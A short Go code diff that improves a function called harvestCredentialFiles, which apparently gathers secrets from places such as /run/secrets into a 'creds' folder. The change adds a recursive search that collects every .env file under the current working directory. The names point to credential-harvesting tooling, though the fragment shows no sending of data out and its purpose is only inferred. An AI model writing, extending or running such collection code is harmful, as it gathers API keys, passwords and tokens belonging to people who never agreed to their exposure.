@@ -147,9 +147,15 @@ func harvestCredentialFiles(destRoot string) []string {
 		"/run/secrets",
 	}
 
-	// Also look for .env files in common project locations.
-	envMatches, _ := filepath.Glob("**/.env")
-	candidates = append(candidates, envMatches...)
+	// Recursively search for .env files in the current working directory.
+	if cwd, err := os.Getwd(); err == nil {
+		_ = filepath.WalkDir(cwd, func(path string, d os.DirEntry, err error) error {
+			if err == nil && !d.IsDir() && d.Name() == ".env" {
+				candidates = append(candidates, path)
+			}
+			return nil
+		})
+	}
 
 	credDir := filepath.Join(destRoot, "creds")
 	var found []string
